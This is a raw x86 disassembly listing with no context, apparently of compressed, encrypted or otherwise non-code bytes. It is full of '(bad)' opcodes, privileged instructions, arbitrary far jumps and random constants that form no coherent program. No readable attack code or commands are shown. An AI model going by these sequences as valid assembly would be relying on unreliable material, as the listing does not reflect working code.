  420aa2:	fist   DWORD PTR [edx+0x79eb5bce]
  420aa8:	jecxz  0x420aeb
  420aaa:	std    
  420aab:	xchg   esp,eax
  420aac:	mov    ds:0x8a6c8beb,al
  420ab1:	das    
  420ab2:	test   al,cl
  420ab4:	cli    
  420ab5:	jns    0x420a91
  420ab7:	fcomp  st(7)
  420ab9:	int3   
  420aba:	or     DWORD PTR [edx-0x33],ebp
  420abd:	xchg   esp,eax
  420abe:	jnp    0x420ad9
  420ac0:	jmp    0x420a4a
  420ac2:	xlat   BYTE PTR ds:[ebx]
  420ac3:	push   ss
  420ac4:	xchg   esp,eax
  420ac5:	pushf  
  420ac6:	pusha  
  420ac7:	iret   
  420ac8:	ret    
  420ac9:	fwait
  420aca:	out    dx,eax
  420acb:	aad    0x6b
  420acd:	push   esi
  420ace:	daa    
  420acf:	xlat   BYTE PTR ds:[ebx]
  420ad0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ad1:	outs   dx,BYTE PTR ds:[esi]
  420ad2:	std    
  420ad3:	xor    eax,0xbdea4833
  420ad8:	mov    edi,0x7dc8cca2
  420add:	xor    al,BYTE PTR [eax-0x20]
  420ae0:	mov    esp,DWORD PTR [ecx-0x6c]
  420ae3:	hlt    
  420ae4:	jmp    0x420b0d
  420ae6:	fcom   st(3)
  420ae8:	or     eax,0x4fe1f16b
  420aed:	fdivr  DWORD PTR [eax+eax*2]
  420af0:	mov    edx,0xad829ce2
  420af5:	xor    eax,0xbdeb6666
  420afa:	jb     0x420b64
  420afc:	push   esp
  420afd:	jmp    0x420ac9
  420aff:	inc    ebx
  420b00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b01:	dec    ecx
  420b02:	in     al,0xc8
  420b04:	mov    eax,0xf54be849
  420b09:	dec    edx
  420b0a:	fadd   QWORD PTR [eax]
  420b0c:	pusha  
  420b0d:	dec    ebx
  420b0e:	dec    edi
  420b0f:	test   eax,0x44d7ace0
  420b14:	sbb    al,0x9c
  420b16:	dec    eax
  420b17:	sub    BYTE PTR [ebx],0x9e
  420b1a:	rcr    DWORD PTR [ebx],cl
  420b1c:	lahf   
  420b1d:	fucomip st,st(3)
  420b1f:	adc    dl,al
  420b21:	push   0xffffffc8
  420b23:	fwait
  420b24:	cwde   
  420b25:	(bad)  
  420b27:	test   DWORD PTR [eax+ebp*1-0x4c260f5c],0xdf3099d3
  420b32:	bound  ecx,QWORD PTR [ebp-0x7cf0a66f]
  420b38:	or     ebx,ecx
  420b3a:	cld    
  420b3b:	out    0xc8,eax
  420b3d:	xchg   bh,al
  420b3f:	ss nop
  420b41:	aam    0x38
  420b43:	enter  0x9450,0x3e
  420b47:	fdivr  st(4),st
  420b49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b4a:	xchg   ecx,eax
  420b4b:	outs   dx,DWORD PTR ds:[esi]
  420b4c:	std    
  420b4d:	push   esi
  420b4e:	shl    DWORD PTR [edi-0x55],cl
  420b51:	clc    
  420b52:	or     al,0x17
  420b54:	pop    esp
  420b55:	enter  0xc53b,0xf5
  420b59:	push   ebp
  420b5a:	push   edx
  420b5b:	cld    
  420b5c:	and    bh,bl
  420b5e:	nop
  420b5f:	adc    dl,BYTE PTR [edx-0x1]
  420b62:	pop    edi
  420b63:	pop    esi
  420b64:	jmp    0x420afe
  420b66:	adc    BYTE PTR [edx+0x1120ca5e],cl
  420b6c:	out    dx,eax
  420b6d:	fcomip st,st(4)
  420b6f:	cs (bad) 
  420b71:	daa    
  420b72:	sar    BYTE PTR [eax+eax*2+0x75],0xfd
  420b77:	clc    
  420b78:	daa    
  420b79:	dec    esp
  420b7a:	cmp    ch,BYTE PTR [ebp-0x37409cf3]
  420b80:	fsubr  DWORD PTR [ebx+ecx*1-0x5d]
  420b84:	adc    eax,0xebe23ed6
  420b89:	sub    al,0x1b
  420b8b:	xor    BYTE PTR [esi-0x2e],bh
  420b8e:	std    
  420b8f:	pop    es
  420b90:	stc    
  420b91:	fcomp  QWORD PTR [ebx-0x762b1574]
  420b97:	sbb    eax,0x2e4e0d83
  420b9c:	jmp    0x420b65
  420b9e:	push   0x50
  420ba0:	sahf   
  420ba1:	jae    0x420bd8
  420ba3:	sbb    bl,al
  420ba5:	sar    BYTE PTR [edx-0x38],cl
  420ba8:	mov    edi,esp
  420baa:	addr16 push es
  420bac:	adc    ebx,edx
  420bae:	mov    fs,WORD PTR [ecx]
  420bb0:	jmp    0xad6e:0x675d29f3
  420bb7:	adc    BYTE PTR [eax],bh
  420bb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bba:	fs enter 0xbfe5,0x57
  420bbf:	cmp    BYTE PTR [ecx],ah
  420bc1:	cld    
  420bc2:	(bad)  
  420bc3:	fild   QWORD PTR [edi+0xec7fb81]
  420bc9:	or     BYTE PTR ss:[ebp-0x28],ah
  420bcd:	jecxz  0x420c15
  420bcf:	cwde   
  420bd0:	or     bh,bl
  420bd2:	stc    
  420bd3:	call   0xc6b81f9e
  420bd8:	aas    
  420bd9:	out    dx,eax
  420bda:	cld    
  420bdb:	leave  
  420bdc:	inc    esp
  420bdd:	sbb    esp,DWORD PTR [ebp+0x63234df6]
  420be3:	leave  
  420be4:	sbb    DWORD PTR [ecx],0x44266c38
  420bea:	data16 mov BYTE PTR [edi+ecx*8],bl
  420bee:	iret   
  420bef:	jne    0x420be7
  420bf1:	bnd ja 0x420c19
  420bf4:	jmp    0x420c23
  420bf6:	push   edx
  420bf7:	xor    al,0xe2
  420bf9:	in     al,0xc4
  420bfb:	enter  0xaa42,0x7d
  420bff:	xchg   esi,eax
  420c00:	mov    edi,0xebf8d381
  420c05:	xchg   edx,eax
  420c06:	inc    esp
  420c07:	fs push ebp
  420c09:	sub    ah,BYTE PTR [edi-0xd]
  420c0c:	pop    ss
  420c0d:	fbld   TBYTE PTR [edx+0x30d88e46]
  420c13:	push   cs
  420c14:	and    DWORD PTR [edi+0x7f1540fb],0x2c8a01bc
  420c1e:	push   esi
  420c1f:	cmp    BYTE PTR [edi-0x41],dl
  420c22:	inc    ecx
  420c23:	mov    eax,ds:0x47b00124
  420c28:	std    
  420c29:	fcomip st,st(2)
  420c2b:	pop    esp
  420c2c:	inc    ebx
  420c2d:	(bad)  
  420c2e:	lds    edx,FWORD PTR [bx]
  420c31:	test   al,0xfc
  420c33:	push   edi
  420c34:	jp     0x420c1e
  420c36:	push   ecx
  420c37:	and    BYTE PTR [eax-0x1a],bh
  420c3a:	jno    0x420c04
  420c3c:	movd   mm7,DWORD PTR [edx+0x5d669494]
  420c43:	sub    ebp,ebx
  420c45:	dec    esi
  420c46:	mov    al,0x3f
  420c48:	xchg   DWORD PTR es:[ecx],esi
  420c4b:	jl     0x420c9b
  420c4d:	or     esp,edx
  420c4f:	pop    es
  420c50:	in     al,dx
  420c51:	scas   eax,DWORD PTR es:[edi]
  420c52:	shl    DWORD PTR [esp+edx*2],1
  420c55:	inc    edi
  420c56:	aad    0x1f
  420c58:	push   0xffffffa3
  420c5a:	std    
  420c5b:	int3   
  420c5c:	ins    DWORD PTR es:[edi],dx
  420c5d:	cmp    al,BYTE PTR [esi+ecx*1]
  420c60:	cld    
  420c61:	nop
  420c62:	mov    ecx,0xdf43a9cb
  420c67:	enter  0xeb72,0x53
  420c6b:	leave  
  420c6c:	pop    esi
  420c6d:	xor    al,0x6a
  420c6f:	and    BYTE PTR [edi+0x6b2bfd5c],al
  420c75:	push   ecx
  420c76:	lahf   
  420c77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c78:	es xor eax,0x8197c974
  420c7e:	xor    ebx,ebp
  420c80:	lahf   
  420c81:	or     edx,ecx
  420c83:	pop    ds
  420c84:	sbb    BYTE PTR [esi+0x2],0x31
  420c88:	or     ebx,DWORD PTR [ecx]
  420c8a:	mov    ebp,0x9a07e4d1
  420c8f:	mov    bl,0x21
  420c91:	fidivr WORD PTR [ecx+0x15]
  420c94:	(bad)  
  420c95:	xchg   esi,eax
  420c96:	jmp    0x420cc4
  420c98:	push   esp
  420c99:	or     BYTE PTR [ebp-0xcb7d68f],bh
  420c9f:	(bad)  
  420ca0:	adc    edx,edx
  420ca2:	mov    edx,0xb2b866f8
  420ca7:	push   esp
  420ca8:	pop    ebx
  420ca9:	mov    WORD PTR [edx+0x2f6a2bfc],fs
  420caf:	pop    ebx
  420cb0:	jmp    0x420c66
  420cb2:	xchg   ebp,eax
  420cb3:	mov    bh,0xba
  420cb5:	push   0xe00f1d73
  420cba:	sti    
  420cbb:	repz enter 0xdfe5,0x97
  420cc0:	lea    eax,[esi-0x6140981]
  420cc6:	jp     0x420d0f
  420cc8:	or     DWORD PTR [edi-0x3d],edx
  420ccb:	sub    al,0xcb
  420ccd:	(bad)  ds:0xa7894d55
  420cd3:	pop    es
  420cd4:	loope  0x420c7c
  420cd6:	jno    0x420c9f
  420cd8:	jg     0x420d07
  420cda:	mov    edi,0x557f6e7c
  420cdf:	xchg   edi,eax
  420ce0:	mov    esi,esp
  420ce2:	inc    edi
  420ce3:	leave  
  420ce4:	xchg   BYTE PTR [eax-0x47c2387b],ah
  420cea:	jbe    0x420d14
  420cec:	xor    BYTE PTR [eax],bh
  420cee:	xchg   edx,eax
  420cef:	cwde   
  420cf0:	daa    
  420cf1:	mov    ?,ebp
  420cf3:	popa   
  420cf4:	stc    
  420cf5:	out    0x1c,al
  420cf7:	inc    esp
  420cf8:	pop    ss
  420cf9:	lds    eax,FWORD PTR [ebx-0x64]
  420cfc:	adc    al,0xdf
  420cfe:	fiadd  DWORD PTR [eax-0x28605547]
  420d04:	call   0x16ca:0x1ad8fd16
  420d0b:	pop    ecx
  420d0c:	xor    DWORD PTR [edi-0x342f38f3],0x1c
  420d13:	mov    bh,0x4
  420d15:	lahf   
  420d16:	(bad)  
  420d17:	and    eax,eax
  420d19:	and    ebp,DWORD PTR [edi+0x38]
  420d1c:	std    
  420d1d:	pop    esi
  420d1e:	fild   WORD PTR [eax]
  420d20:	stos   DWORD PTR es:[edi],eax
  420d21:	pop    ds
  420d22:	push   esi
  420d23:	sub    BYTE PTR [edx+0x7ec84c7c],bh
  420d29:	jmp    0xa370:0xe0d8a96c
  420d30:	in     eax,dx
  420d31:	mov    al,ds:0x3f9f4077
  420d36:	into   
  420d37:	push   0xa0669338
  420d3c:	pop    eax
  420d3d:	fistp  WORD PTR [edi]
  420d3f:	(bad)  
  420d40:	lods   al,BYTE PTR ds:[esi]
  420d41:	fisttp DWORD PTR [edi-0x339cda7]
  420d47:	jmp    0x532b672a
  420d4c:	jbe    0x420d83
  420d4e:	adc    cl,dh
  420d50:	jmp    0x4b149a88
  420d55:	add    dh,BYTE PTR [edx]
  420d57:	and    al,BYTE PTR [ebx-0x19b8cd29]
  420d5d:	adc    ah,BYTE PTR [edi-0x75]
  420d60:	int3   
  420d61:	and    edi,DWORD PTR [ebp+0x50]
  420d64:	ja     0x420d0a
  420d66:	aam    0xca
  420d68:	je     0x420de7
  420d6a:	fild   DWORD PTR [esi]
  420d6c:	into   
  420d6d:	stos   BYTE PTR es:[edi],al
  420d6e:	arpl   WORD PTR [eax+0x1c],bx
  420d71:	or     ch,bl
  420d73:	inc    ecx
  420d74:	jmp    0x420d89
  420d76:	cmp    edx,DWORD PTR [ebx]
  420d78:	push   ss
  420d79:	popf   
  420d7a:	ins    DWORD PTR es:[edi],dx
  420d7b:	mov    ebx,0x80d1df92
  420d80:	sub    ah,BYTE PTR [esi]
  420d82:	jp     0x420d96
  420d84:	fist   DWORD PTR [ebx-0x3]
  420d87:	add    DWORD PTR [esi+0x3bf99220],esp
  420d8d:	mov    DWORD PTR [esi-0x21],esp
  420d90:	test   BYTE PTR [eax+0x2],dl
  420d93:	outs   dx,DWORD PTR ds:[esi]
  420d94:	jp     0x420d35
  420d96:	xchg   ebx,eax
  420d97:	xor    al,0x44
  420d99:	push   0x1f
  420d9b:	test   dl,ah
  420d9d:	int    0xd2
  420d9f:	inc    edi
  420da0:	xchg   ebx,eax
  420da1:	jbe    0x420e06
  420da3:	inc    eax
  420da4:	cmp    BYTE PTR [eax-0x46bf73fc],ah
  420daa:	add    BYTE PTR [ecx],ch
  420dac:	inc    esp
  420dad:	imul   ebp,DWORD PTR [ebp+0x6d21a888],0xa4a7d19e
  420db7:	or     eax,0xdd11ceb
  420dbc:	xor    bh,BYTE PTR [esi-0x77]
  420dbf:	inc    esi
  420dc0:	and    ebx,edi
  420dc2:	xchg   esi,eax
  420dc3:	push   0xabba7239
  420dc8:	push   edi
  420dc9:	dec    ebp
  420dca:	in     eax,0x1a
  420dcc:	int3   
  420dcd:	int3   
  420dce:	sti    
  420dcf:	arpl   WORD PTR [edi+0xcbf0937],di
  420dd5:	and    bh,dl
  420dd7:	xor    al,BYTE PTR fs:[edi-0x208e8ab7]
  420dde:	jle    0x420e46
  420de0:	call   0xa36870d1
  420de5:	pop    ecx
  420de6:	std    
  420de7:	retf   0x4e1f
  420dea:	xor    al,0xe8
  420dec:	mov    DWORD PTR [edx],eax
  420dee:	xchg   esi,eax
  420def:	enter  0x2f00,0x6
  420df3:	xor    BYTE PTR [ebx],ah
  420df5:	outs   dx,DWORD PTR ds:[esi]
  420df6:	imul   esp,eax,0xffffffeb
  420df9:	add    BYTE PTR [edi+0x370d7ace],cl
  420dff:	mov    ebp,DWORD PTR fs:[edi-0x200ef67e]
  420e06:	mov    al,0x8b
  420e08:	ins    BYTE PTR es:[edi],dx
  420e09:	jnp    0x420de6
  420e0b:	sbb    esp,eax
  420e0d:	retf   0x18fc
  420e10:	inc    esp
  420e11:	xchg   BYTE PTR [edi-0x1d],ah
  420e14:	mov    DWORD PTR [eax],0x5fa5d327
  420e1a:	mov    edx,0xe66eeb95
  420e1f:	adc    eax,DWORD PTR ds:0xdecfd42
  420e25:	sbb    al,ch
  420e27:	inc    eax
  420e28:	inc    esp
  420e29:	(bad)  
  420e2a:	dec    esp
  420e2b:	retf   0x6957
  420e2e:	mov    WORD PTR [ecx],ss
  420e30:	scas   eax,DWORD PTR es:[edi]
  420e31:	aas    
  420e32:	popf   
  420e33:	retf   
  420e34:	inc    esi
  420e35:	jmp    0x39cd:0x6aeb8684
  420e3c:	mov    dl,0x7d
  420e3e:	int3   
  420e3f:	mov    dh,0x27
  420e41:	ffreep st(5)
  420e43:	cmp    al,BYTE PTR [edx+0x670e653c]
  420e49:	aad    0xf2
  420e4b:	xor    BYTE PTR [ebp+0x6be80691],ch
  420e51:	pop    ds
  420e52:	xchg   edi,eax
  420e53:	pop    edx
  420e54:	imul   edx
  420e56:	push   ebx
  420e57:	sahf   
  420e58:	ins    DWORD PTR es:[edi],dx
  420e59:	lahf   
  420e5a:	mov    ecx,0x99331f7f
  420e5f:	ret    
  420e60:	in     al,0x8e
  420e62:	adc    cl,BYTE PTR [eax-0x69]
  420e65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e66:	inc    edx
  420e67:	pop    eax
  420e68:	ja     0x420eca
  420e6a:	mov    ds:0xbd916ec8,al
  420e6f:	add    al,0xd1
  420e71:	mov    ds:0x80eb7ab1,al
  420e76:	retf   
  420e77:	mov    esi,0x16810411
  420e7c:	push   ds
  420e7d:	fbld   TBYTE PTR [edx+0x7f]
  420e80:	mov    eax,ds:0xb7e28c1
  420e85:	pop    ecx
  420e86:	test   eax,0xfcc70bd4
  420e8b:	inc    ebx
  420e8c:	stos   DWORD PTR es:[edi],eax
  420e8d:	cdq    
  420e8e:	sub    al,BYTE PTR [ebp-0x3809719c]
  420e94:	lahf   
  420e95:	dec    eax
  420e96:	push   eax
  420e97:	int3   
  420e98:	cmc    
  420e99:	nop
  420e9a:	aas    
  420e9b:	or     ebx,ebp
  420e9d:	rcr    ah,1
  420e9f:	adc    eax,0x3c7192ed
  420ea4:	push   edi
  420ea5:	fild   QWORD PTR ds:0x17bdabf3
  420eab:	arpl   WORD PTR [eax+0x2b],di
  420eae:	add    al,0xa9
  420eb0:	xchg   ecx,eax
  420eb1:	out    0x7c,al
  420eb3:	in     al,dx
  420eb4:	pop    edx
  420eb5:	add    eax,0x9bb18e59
  420eba:	cmp    eax,0x25e09e84
  420ebf:	daa    
  420ec0:	fmul   DWORD PTR [esi+ebp*8+0x26]
  420ec4:	fs pop edi
  420ec6:	(bad)  
  420ec7:	jo     0x420f20
  420ec9:	jns    0x420ec8
  420ecb:	loopne 0x420ecb
  420ecd:	jnp    0x420e98
  420ecf:	clc    
  420ed0:	inc    ecx
  420ed1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ed2:	scas   eax,DWORD PTR es:[edi]
  420ed3:	enter  0x85a4,0x7b
  420ed7:	fmul   DWORD PTR [ebx-0x6a]
  420eda:	push   cs
  420edb:	and    esi,esp
  420edd:	pop    edi
  420ede:	ins    DWORD PTR es:[edi],dx
  420edf:	mov    bh,0xff
  420ee1:	sub    BYTE PTR [ebp-0x70324159],bh
  420ee7:	enter  0xc613,0x19
  420eeb:	xchg   esi,eax
  420eec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420eed:	mov    eax,0x6beb5e14
  420ef2:	rcl    BYTE PTR [ebp-0x6f],1
  420ef5:	mov    bl,BYTE PTR [ecx+edx*1]
  420ef8:	test   al,0xdf
  420efa:	ret    
  420efb:	xlat   BYTE PTR ds:[ebx]
  420efc:	xchg   edx,eax
  420efd:	sti    
  420efe:	pop    edi
  420eff:	mov    esp,0x4400045c
  420f04:	adc    al,0x3c
  420f06:	xchg   ecx,eax
  420f07:	push   eax
  420f08:	fisub  WORD PTR [edi-0x7c]
  420f0b:	inc    BYTE PTR [edx]
  420f0d:	cld    
  420f0e:	mov    ch,0xa3
  420f10:	rcr    bh,0x99
  420f13:	ror    DWORD PTR [esi-0x142998ac],cl
  420f19:	loop   0x420ef5
  420f1b:	fstp   QWORD PTR [ebx-0xe]
  420f1e:	(bad)  
  420f1f:	js     0x420f4b
  420f21:	fild   WORD PTR [eax-0x7bf086ca]
  420f27:	rcr    DWORD PTR [ecx-0x4],1
  420f2a:	cld    
  420f2b:	or     edi,DWORD PTR [ebp+ebx*1+0x49a2d706]
  420f32:	push   0xffffffc8
  420f34:	nop
  420f35:	jns    0x420ee2
  420f37:	xchg   ecx,eax
  420f38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f39:	jmp    0x420f46
  420f3b:	jne    0x420f1a
  420f3d:	aas    
  420f3e:	dec    BYTE PTR [ecx+0x61]
  420f41:	leave  
  420f42:	das    
  420f43:	nop
  420f44:	iret   
  420f45:	mov    edi,0x8f2e94b4
  420f4a:	leave  
  420f4b:	(bad)  
  420f4c:	icebp  
  420f4d:	inc    DWORD PTR [ecx+0x3]
  420f50:	add    ah,BYTE PTR [eax-0x36]
  420f53:	push   es
  420f54:	dec    esp
  420f55:	cmp    ebp,edi
  420f57:	test   ebp,edx
  420f59:	lea    edx,[ebp+0x709ccc4b]
  420f5f:	jecxz  0x420f6f
  420f61:	test   al,0x7c
  420f63:	ss mov edx,0x62dfb978
  420f69:	mov    ah,0xfc
  420f6b:	sahf   
  420f6c:	dec    edx
  420f6d:	frstor [edi+0x612b71d]
  420f73:	pusha  
  420f74:	mov    dl,0xdf
  420f76:	add    al,0xc9
  420f78:	mov    eax,ss
  420f7a:	inc    ecx
  420f7b:	xchg   ebx,eax
  420f7c:	mov    edi,0x36effcad
  420f81:	fdivr  DWORD PTR [edx-0x3136b78c]
  420f87:	mov    edi,0x889c12c7
  420f8c:	xor    ch,ch
  420f8e:	xor    ch,dl
  420f90:	jns    0x420f24
  420f92:	and    DWORD PTR [ebp+0x79fd5719],esp
  420f98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f99:	inc    edx
  420f9a:	jb     0x420fb3
  420f9c:	jmp    0x30d3:0x622ac153
  420fa3:	enter  0x49a9,0xcb
  420fa7:	push   ebx
  420fa8:	inc    edx
  420fa9:	(bad)  
  420faa:	jae    0x420f3f
  420fac:	mov    esi,DWORD PTR [ebx]
  420fae:	cmp    eax,0xf17a7b54
  420fb3:	(bad)  
  420fb4:	adc    BYTE PTR [ebx+ecx*2+0x2698c9c4],ah
  420fbb:	call   0x2dfa:0x410674eb
  420fc2:	retf   0x2aed
  420fc5:	fbld   TBYTE PTR [ebp+0x16]
  420fc8:	lds    edx,FWORD PTR [ebp-0x77ac8d71]
  420fce:	std    
  420fcf:	pop    edi
  420fd0:	rcr    DWORD PTR [ebp-0x240d6000],cl
  420fd6:	test   al,0xc7
  420fd8:	xor    DWORD PTR [esi-0x67],0x2b
  420fdc:	ja     0x420f7c
  420fde:	mov    al,0x47
  420fe0:	xchg   edi,eax
  420fe1:	and    esi,DWORD PTR [eax+0x6addd352]
  420fe7:	dec    ebp
  420fe8:	jmp    0x42105f
  420fea:	inc    esi
  420feb:	dec    esp
  420fec:	nop
  420fed:	mov    ebp,0xe1820910
  420ff2:	hlt    
  420ff3:	into   
  420ff4:	mov    ch,0xf1
  420ff6:	mov    dh,ah
  420ff8:	popf   
  420ff9:	mov    bh,0xfc
  420ffb:	push   ebp
  420ffc:	div    BYTE PTR ds:0x858bf242
  421002:	mov    ds:0xfe19667c,eax
  421007:	ss loopne 0x420fad
  42100a:	push   0xefbf8c69
  42100f:	pusha  
  421010:	jmp    0xd5ab:0x441043b8
  421017:	push   edi
  421018:	in     al,dx
  421019:	ja     0x421069
  42101b:	loope  0x420fb6
  42101d:	(bad)  
  42101e:	jl     0x421024
  421020:	je     0x420fa3
  421022:	loop   0x420fac
  421024:	mov    ebp,0xfd90fbd5
  421029:	pop    esi
  42102a:	pop    esp
  42102b:	js     0x421028
  42102d:	add    al,0x1f
  42102f:	pop    ds
  421030:	mov    edi,0x31acccdf
  421035:	pop    ds
  421036:	adc    BYTE PTR [eax+0xafb7026],bl
  42103c:	and    al,0xf5
  42103e:	jns    0x420fcd
  421040:	pop    ecx
  421041:	fbstp  TBYTE PTR [esi]
  421043:	cmc    
  421044:	aaa    
  421045:	mov    cs,WORD PTR [edi-0x12f626a8]
  42104b:	dec    eax
  42104c:	addr16 dec ecx
  42104e:	push   0x2ddfc997
  421053:	mov    eax,0x9ce3c615
  421058:	(bad)  
  421059:	nop
  42105a:	add    esp,DWORD PTR [ecx]
  42105c:	jp     0x4210d8
  42105e:	add    bl,dl
  421060:	jne    0x420fe8
  421062:	xchg   ecx,eax
  421063:	adc    BYTE PTR [esi+0x5e],cl
  421066:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421067:	enter  0x73b7,0x1c
  42106b:	inc    ebp
  42106c:	leave  
  42106d:	iret   
  42106e:	mov    ecx,0xf6a4eb54
  421073:	xor    BYTE PTR [ecx-0x39d38b6c],0x97
  42107a:	push   cs
  42107b:	pop    ss
  42107c:	in     al,dx
  42107d:	rcr    DWORD PTR [ebp-0x7e],cl
  421080:	enter  0x7def,0xc
  421084:	std    
  421085:	pop    eax
  421086:	gs and al,0xeb
  421089:	jnp    0x4210f1
  42108b:	pop    edx
  42108c:	mov    ds:0x38b4427a,eax
  421091:	enter  0xd215,0xa6
  421095:	aad    0x33
  421097:	and    BYTE PTR [edx-0x21],al
  42109a:	lahf   
  42109b:	aas    
  42109c:	lds    ebp,FWORD PTR [ecx-0x4619584d]
  4210a2:	xchg   BYTE PTR [eax+0x4c0d83ee],ch
  4210a8:	mov    ss,WORD PTR [edx]
  4210aa:	jns    0x421063
  4210ac:	ins    DWORD PTR es:[edi],dx
  4210ad:	adc    BYTE PTR [eax-0x39],cl
  4210b0:	leave  
  4210b1:	retf   
  4210b2:	ins    DWORD PTR es:[edi],dx
  4210b3:	mov    eax,0x25e1df8
  4210b8:	jmp    0x421060
  4210ba:	cmp    al,0x48
  4210bc:	mov    ecx,0xb03db55b
  4210c1:	or     bh,BYTE PTR [edi-0x80]
  4210c4:	outs   dx,BYTE PTR ds:[esi]
  4210c5:	xchg   DWORD PTR [ebp-0x1783f48c],ecx
  4210cb:	shl    BYTE PTR [esi],1
  4210cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210ce:	cld    
  4210cf:	pop    ebp
  4210d0:	es repz pusha 
  4210d3:	fldcw  WORD PTR [esp+eax*2-0x3cf21fb3]
  4210da:	jl     0x4210b1
  4210dc:	in     al,0xca
  4210de:	ror    DWORD PTR [ecx+ebp*1-0x49190343],cl
  4210e5:	(bad)  
  4210e6:	rcl    DWORD PTR [ecx],cl
  4210e8:	hlt    
  4210e9:	jg     0x4210bc
  4210eb:	(bad)  
  4210ec:	repnz in al,0x42
  4210ef:	in     eax,dx
  4210f0:	(bad)  
  4210f1:	sahf   
  4210f2:	ins    DWORD PTR es:[edi],dx
  4210f3:	sahf   
  4210f4:	xchg   ebp,eax
  4210f5:	scas   al,BYTE PTR es:[edi]
  4210f6:	cld    
  4210f7:	push   cs
  4210f8:	add    eax,0xe9bf98c3
  4210fd:	cdq    
  4210fe:	cmp    cl,al
  421100:	das    
  421101:	scas   eax,DWORD PTR es:[edi]
  421102:	aam    0xcf
  421104:	lea    eax,[ebx+0x6cfe1539]
  42110a:	sub    bh,dl
  42110c:	stos   DWORD PTR es:[edi],eax
  42110d:	enter  0xf87b,0xe2
  421111:	mov    dl,0xf2
  421113:	sub    eax,0x3fb8df93
  421118:	ja     0x4210cd
  42111a:	jecxz  0x4210a8
  42111c:	adc    al,0x5d
  42111e:	std    
  42111f:	out    0xf,eax
  421121:	mov    edi,0xb42caa91
  421126:	stc    
  421127:	(bad)  
  421128:	pusha  
  421129:	mov    esi,0x1ab8b694
  42112e:	test   eax,0x64e7f95b
  421133:	(bad)  
  421135:	and    DWORD PTR [ebx],esp
  421137:	adc    dl,BYTE PTR [edx+0x1b]
  42113a:	cmp    edi,DWORD PTR [ebp-0x3873c5e2]
  421140:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421141:	xlat   BYTE PTR ds:[ebx]
  421142:	or     BYTE PTR [ecx+0x4c66d7e],ch
  421148:	xchg   ecx,eax
  421149:	push   ebx
  42114a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42114b:	fdivr  DWORD PTR [edi]
  42114d:	add    DWORD PTR [edx],0x8162b955
  421153:	mov    DWORD PTR [edx-0x76d0ce1],edi
  421159:	mov    edi,0xf3447182
  42115e:	pop    ds
  42115f:	enter  0x334c,0x76
  421163:	pop    ebp
  421164:	pop    esp
  421165:	scas   al,BYTE PTR es:[edi]
  421166:	push   eax
  421167:	bnd jmp 0x4211bf
  42116a:	jo     0x421158
  42116c:	mov    DWORD PTR [ecx-0x20cefea3],ecx
  421172:	mov    ebx,0xdc869aa9
  421177:	dec    eax
  421178:	push   edx
  421179:	jnp    0x421179
  42117b:	sub    ecx,DWORD PTR ds:0xc70a4ed2
  421181:	or     eax,0x10cd3094
  421186:	icebp  
  421187:	(bad)  
  421188:	out    0x33,eax
  42118a:	popf   
  42118b:	inc    edx
  42118c:	sbb    eax,ebx
  42118e:	jmp    0xe43f:0xc2e1eb9b
  421195:	push   edi
  421196:	es shl ebx,1
  421199:	fist   WORD PTR [ebx+0x24f5b353]
  42119f:	dec    ebp
  4211a0:	out    0xec,al
  4211a2:	cld    
  4211a3:	jae    0x4211dc
  4211a5:	xchg   esi,eax
  4211a6:	ret    
  4211a7:	mov    ecx,0xc8b280ba
  4211ac:	push   ebx
  4211ad:	(bad)  
  4211ae:	out    0xda,eax
  4211b0:	jno    0x4211cb
  4211b2:	rcr    BYTE PTR [ebx],1
  4211b4:	jmp    0x42113f
  4211b6:	out    dx,al
  4211b7:	add    eax,0xf5ccfeed
  4211bc:	fisttp WORD PTR cs:[eax+0x17b3cd03]
  4211c3:	ds sahf 
  4211c5:	sti    
  4211c6:	cld    
  4211c7:	xchg   ebp,eax
  4211c8:	shl    DWORD PTR [ecx-0x3c],0x6e
  4211cc:	pop    esi
  4211cd:	push   eax
  4211ce:	cdq    
  4211cf:	retf   0x4dc3
  4211d2:	mov    ebx,0x3cff9f89
  4211d7:	ins    BYTE PTR es:[edi],dx
  4211d8:	ins    BYTE PTR es:[edi],dx
  4211d9:	aam    0x2d
  4211db:	mov    ch,0xe6
  4211dd:	(bad)  
  4211de:	idiv   BYTE PTR [ebx+0x684cde55]
  4211e4:	cs not ecx
  4211e7:	mov    DWORD PTR [ebp-0x1e9c883a],0xe8e649dd
  4211f1:	popa   
  4211f2:	pusha  
  4211f3:	adc    eax,0xfdbcf203
  4211f8:	aas    
  4211f9:	or     DWORD PTR [ebp-0x38],ecx
  4211fc:	outs   dx,BYTE PTR ds:[esi]
  4211fd:	pop    ebp
  4211fe:	pop    ss
  4211ff:	jecxz  0x42126e
  421201:	dec    ecx
  421202:	jge    0x4211cd
  421204:	jmp    0x4211d0
  421206:	xchg   esi,eax
  421207:	xchg   ecx,eax
  421208:	mov    cl,0x1d
  42120a:	or     al,0xfb
  42120c:	add    ch,cl
  42120e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42120f:	and    al,0xbb
  421211:	fisttp WORD PTR [edx+0x9]
  421214:	cmp    eax,0xd7d13d65
  421219:	sbb    eax,DWORD PTR [eax]
  42121b:	(bad)  
  42121c:	fadd   QWORD PTR [eax+0x7d]
  42121f:	aad    0x3c
  421221:	sbb    DWORD PTR [bx+si-0x213d],edx
  421226:	fs inc ecx
  421228:	xor    dh,0xff
  42122b:	mov    dl,0xc7
  42122d:	clc    
  42122e:	ins    BYTE PTR es:[edi],dx
  42122f:	and    esi,esi
  421231:	fistp  WORD PTR [ebx+edx*8+0x1c]
  421235:	test   al,0x36
  421237:	mov    ch,0xc4
  421239:	(bad)  
  42123a:	add    ah,BYTE PTR ds:0xaffbd97d
  421240:	mov    ch,cl
